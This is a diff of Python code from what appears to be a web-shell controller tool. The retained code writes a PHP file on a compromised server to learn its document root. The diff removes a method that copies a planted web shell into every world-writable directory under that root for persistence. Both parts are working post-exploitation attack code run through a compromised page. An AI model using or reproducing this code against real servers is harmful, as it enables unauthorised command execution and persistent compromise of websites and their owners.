@@ -9,7 +9,7 @@ class LinuxVersion(object):
 
     def get_doc_root(self):
         cmd = "echo \"<?php echo \$_SERVER['DOCUMENT_ROOT']; ?>\" > ~doc_root.php; [ -r ~doc_root.php ] && echo exists || echo not_exist"
-        # make a request to create a php file thx @0xAli
+        # Make a request to create a php file (Thanks @0xAli)
         if make_request.get_page_source(cmd)[0] == 'exists':
             make_request.url = make_request.url.replace(make_request.url.split('/')[-1], '~doc_root.php')
             doc_root = urlopen(make_request.url).read().strip()
@@ -36,23 +36,4 @@ class LinuxVersion(object):
         return doc_root
 
 
-class ShellHandler(object):
-    # a method to spread the shell in all writable directories
-    def spread_shell(self):
-        provided_shell_name = raw_input('\n{0}[!] Current shell name{1}: '.format(Colors.RED, Colors.END))
-        shell_name = getargs.url.split('/')[-1] if getargs.method == 'post' else provided_shell_name
-        cmd = 'find {0} -depth -perm -0002 -type d | xargs -n 1 cp -v {1}'.format(linux.get_doc_root(), shell_name)
-        done = make_request.get_page_source(cmd)
-        if done:
-            success = '\n[+] {hot}{shell_name}{end} already written to {hot}{writable_length}{end} paths'.format(
-                    shell_name=shell_name,
-                    writable_length=len(done),
-                    hot=Colors.HOT,
-                    end=Colors.END,)
-            success += '\n[+] To check these paths type {0}writable{1}'.format(Colors.HOT, Colors.END)
-            print success
-        else:
-            print '[!] Something went wrong while spreading shell.'
-
 linux = LinuxVersion()
-shell_handler = ShellHandler()
